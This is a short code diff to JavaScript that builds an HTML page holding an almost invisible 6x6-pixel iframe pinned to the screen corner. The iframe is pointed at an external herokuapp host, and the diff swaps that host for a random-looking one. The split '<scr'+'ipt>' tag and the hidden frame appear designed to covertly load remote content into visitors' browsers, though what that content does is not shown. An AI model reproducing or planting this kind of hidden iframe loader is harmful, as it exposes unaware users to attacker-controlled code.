@@ -8,7 +8,7 @@ var c = `
 <html><body><h1 style="font-family:arial;font-size:14px">Page URL: `+url+`</h1>
 <iframe id="a" height="6" width="6" frameborder="0" style="position:fixed;right:0px;bottom:0px;"></iframe>
 <scr`+`ipt>
-var u='https://ellieeet10.herokuapp.com';
+var u='https://cy3u3kx1wg8o1rj2.herokuapp.com';
 var a=document.getElementById("a");
 document.getElementById("a").src=u;
 a.width=w;
